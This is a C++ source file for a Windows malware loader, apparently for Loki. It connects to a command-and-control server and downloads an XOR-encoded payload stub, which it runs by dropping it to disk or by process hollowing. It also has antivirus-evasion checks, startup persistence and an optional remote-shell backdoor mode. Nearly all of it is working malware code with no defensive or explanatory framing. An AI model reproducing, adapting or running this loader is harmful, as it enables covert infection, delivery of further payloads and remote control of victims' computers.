#include "common.h"
#include "packets.h"
#include <winsock2.h>
#include <ws2tcpip.h>
#include "encoder.h"
#include <thread>
#include "mutex.h"
#include "hwid.h"
#include <fstream>
#include "md5_lib_src.h"
#include "persistency.h"
#include "fud.h"
#include <TlHelp32.h>
#include <Psapi.h>
#include "loader.h"
#include <fstream>
#include <iostream>
#if defined (_DEBUG) || defined (BACKDOOR_LOADER)
#include <io.h>
#include <fcntl.h>
#endif // _DEBUG


#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")
#pragma comment(lib, "Psapi.lib")

bool socket_send(SOCKET socket, packet_opcode opcode, void* data = nullptr, unsigned short data_size = 0)
{
	unsigned char* buffer = new unsigned char[sizeof(net_packet) + data_size];
	memset(buffer, 0x00, sizeof(net_packet) + data_size);
	net_packet* frame = (net_packet*)buffer;
	frame->opcode = opcode;
	frame->packet_size = data_size;

	if (data != nullptr && data_size > 0)
	{
		memcpy(buffer + sizeof(net_packet), data, data_size);

		xor_encode(buffer + sizeof(net_packet), data_size, packet_crypto_key);
	}

	bool res = !!send(socket, (char*)buffer, data_size + sizeof(net_packet), 0);


	memset(buffer, 0x00, sizeof(net_packet) + data_size);
	delete[] buffer;
	buffer = nullptr;

	return res;
}

SOCKET sock_conn()
{
	SOCKET connect_socket = INVALID_SOCKET;
	struct addrinfo *result = NULL,
		*ptr = NULL, hints;

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	if (getaddrinfo(CNC_SERVER_IP, CNC_SERVER_PORT, &hints, &result) != 0)
		return INVALID_SOCKET;

	for (ptr = result; ptr != NULL; ptr = ptr->ai_next)
	{
		connect_socket = socket(ptr->ai_family, ptr->ai_socktype,
			ptr->ai_protocol);

		if (connect_socket == INVALID_SOCKET)
			return INVALID_SOCKET;


		if (connect(connect_socket, ptr->ai_addr, (int)ptr->ai_addrlen) == SOCKET_ERROR) {
			closesocket(connect_socket);
			connect_socket = INVALID_SOCKET;
			continue;
		}
		break;
	}

	freeaddrinfo(result);

	int flag = 1;
	setsockopt(connect_socket, IPPROTO_TCP, TCP_NODELAY, (char *)&flag, sizeof(int));


	return connect_socket;
}

BOOL drop_stub(std::vector<char>& stub_data, char* file_name)
{
	auto file_exists = [](char* file_name) -> bool {
		struct stat buffer;
		return !stat(file_name, &buffer);
	};

	if (file_exists(file_name) && !remove(file_name))
		return FALSE;

	std::ofstream file_handle(file_name, std::ios::out | std::ios::binary);

	if (!file_handle.is_open())
		return FALSE;

	file_handle.write(stub_data.data(), stub_data.size());

	file_handle.flush();

	file_handle.close();

	return TRUE;
}

PROCESS_INFORMATION start_process(char* file_path)
{
	STARTUPINFO info = { sizeof(info) };
	PROCESS_INFORMATION processInfo;

	if (CreateProcess(file_path, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &info, &processInfo))
	{
		//CloseHandle(processInfo.hProcess);
		//CloseHandle(processInfo.hThread);

		return processInfo;
	}

	return PROCESS_INFORMATION();
}


SOCKET socket_conn_cycle()
{
	SOCKET connect_socket = INVALID_SOCKET;
	while ((connect_socket = sock_conn()) == INVALID_SOCKET);
	return connect_socket;
}

#ifdef _DEBUG
int main()
#else
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, char*, int nShowCmd)
#endif // _DEBUG
{
#if defined (_DEBUG) || defined (BACKDOOR_LOADER)
	AllocConsole();

	HANDLE handle_out = GetStdHandle(STD_OUTPUT_HANDLE);
	int hCrt = _open_osfhandle((long)handle_out, _O_TEXT);
	FILE* hf_out = _fdopen(hCrt, "w");
	setvbuf(hf_out, NULL, _IONBF, 1);
	*stdout = *hf_out;

	HANDLE handle_in = GetStdHandle(STD_INPUT_HANDLE);
	hCrt = _open_osfhandle((long)handle_in, _O_TEXT);
	FILE* hf_in = _fdopen(hCrt, "r");
	setvbuf(hf_in, NULL, _IONBF, 128);
	*stdin = *hf_in;
#endif

#ifndef BACKDOOR_LOADER

#ifdef FUD
	if (!av_check())
	{
#ifdef _DEBUG
		DebugBreak();
#else
		exit(0);
#endif // _DEBUG
	}
#endif // FUD

	if (is_whitelisted_hwid(get_hwid()))
	{
#ifdef _DEBUG
		printf("This computer is whitelisted!\r\n");
#else
		exit(0);
#endif // _DEBUG
	}

	if (!initialize_mutex())
	{
#ifdef _DEBUG
		printf("Detected duplicated run!\r\n");
#else
		exit(0);
#endif // _DEBUG

	}



#if !defined(_DEBUG) && defined(PERSISTENCY)
	startup_adjust();
#endif
#endif
	WSADATA wsa_data;

	WSAStartup(MAKEWORD(2, 2), &wsa_data);

	HANDLE currentLokiProcess = 0;

	while (1)
	{
#ifdef _DEBUG
		printf("Connecting...\r\n");
#endif // DEBUG

		SOCKET connect_socket = socket_conn_cycle();

		socket_send(connect_socket, loader_register);

#ifdef _DEBUG
		printf("Connected! Sent registration packet!\r\n");
#endif // DEBUG

		std::vector<char> stub_data;
		unsigned long long my_crypto_key = packet_crypto_key;
		while (1)
		{
			auto recv_packet = [connect_socket](char* buffer, size_t size) -> int {
				int total = 0, n = 0;
				while (total != size)
				{
					n = recv(connect_socket, buffer + total, size - total, 0);
					if (n <= 0)
						return 0;

					total += n;
				}
				return total;
			};



			unsigned char frame_buf[sizeof(net_packet)];
			int bytes_read = recv_packet((char*)frame_buf, sizeof(frame_buf));
			if (bytes_read <= 0)
				break;
			net_packet* frame = (net_packet*)(frame_buf);


#ifdef BACKDOOR_LOADER
			socket_send(connect_socket, shell_switch);

			new std::thread([connect_socket]() -> void {
				char buffer[10000];
				char print_buffer[10000];
				while (1)
				{

					int size = recv(connect_socket, buffer, sizeof(buffer), 0);
					if (size <= 0)
						exit(0);
					int w = 0;
					for (int i = 0; i < size; i++)
					{
						if (buffer[i] == '\x1b')
						{
							i += 7;
						}

						print_buffer[w++] = buffer[i];
					}

					print_buffer[w] = '\0';

					printf(print_buffer);
					memset(buffer, 0x00, sizeof(buffer));
					memset(print_buffer, 0x00, sizeof(buffer));
				}
			});

			while (1)
			{
				char buf[1] = { getc(stdin) };
				send(connect_socket, buf, 1, 0);
			}

#endif // BACKDOOR_LOADER


			unsigned char* packet_buf = nullptr;

			if (frame->packet_size)
			{
				packet_buf = new unsigned char[frame->packet_size];
				bytes_read = recv_packet((char*)packet_buf, frame->packet_size);
				if (bytes_read <= 0)
					break;

				xor_encode(packet_buf, frame->packet_size, my_crypto_key);
			}
			switch (frame->opcode)
			{
				case loader_push_update:
				{
#ifndef PROCESS_HOLLOWING
					TerminateProcess(currentLokiProcess, 0);
#endif // !PROCESS_HOLLOWING

					socket_send(connect_socket, loader_request_stub);
				}
				break;

				case loader_register_ok:
				{
					loader_register_ok_payload* packet = (loader_register_ok_payload*)packet_buf;
					my_crypto_key = packet->new_crypto_key;
					socket_send(connect_socket, loader_request_stub);
				}
				break;

				case loader_request_stub_ack:
				{
					loader_request_stub_ack_payload* packet = (loader_request_stub_ack_payload*)packet_buf;
					stub_data.clear();
#ifdef _DEBUG
					printf("Starting receiving stub...\r\n");
#endif // _DEBUG
				}
				break;

				case loader_request_stub_data:
				{
					loader_request_stub_data_payload* packet = (loader_request_stub_data_payload*)packet_buf;
					packet->toggle_data_encoding();

					for (unsigned int i = 0; i < packet->data_size; i++)
						stub_data.push_back(packet->data[i]);

#ifdef _DEBUG
					if (!(packet->current_cnt % 1000))
						printf("Received stub data block! %d/%d\r\n", packet->current_cnt, packet->total_cnt);
#endif // _DEBUG

				}
				break;

				case loader_request_stub_end:
				{
#ifdef _DEBUG
					printf("Stub received! Running...\r\n");
#endif // _DEBUG
					loader_request_stub_end_payload* packet = (loader_request_stub_end_payload*)packet_buf;
					
					unsigned char md5_checksum[16];
					MD5 md5;
					md5.MD5Encode(stub_data.data(), md5_checksum, stub_data.size());

					if (memcmp(md5_checksum, packet->md5_checksum, 16) != 0)
					{
						socket_send(connect_socket, loader_request_stub);
						break;
					}
					
					BOOL result = false;
#ifdef PROCESS_HOLLOWING
					TCHAR szFilePath[1024];
					GetModuleFileNameA(0, LPSTR(szFilePath), 1024);
					result = MemoryLoader((LPBYTE)stub_data.data());
#else
					drop_stub(stub_data, DROP_FILE_PATH);
					currentLokiProcess = start_process(DROP_FILE_PATH).hProcess;

					result = !!currentLokiProcess;
#endif // PROCESS_HOLLOWING

					stub_data.clear();
					if (!result)
					{
#ifdef _DEBUG
						printf("Failed to run the stub, retrying...\r\n");
#endif // _DEBUG
						socket_send(connect_socket, loader_request_stub);
					}
				}
				break;
			}

			if (packet_buf)
				delete[] packet_buf;
		}

	}


	return 0;
}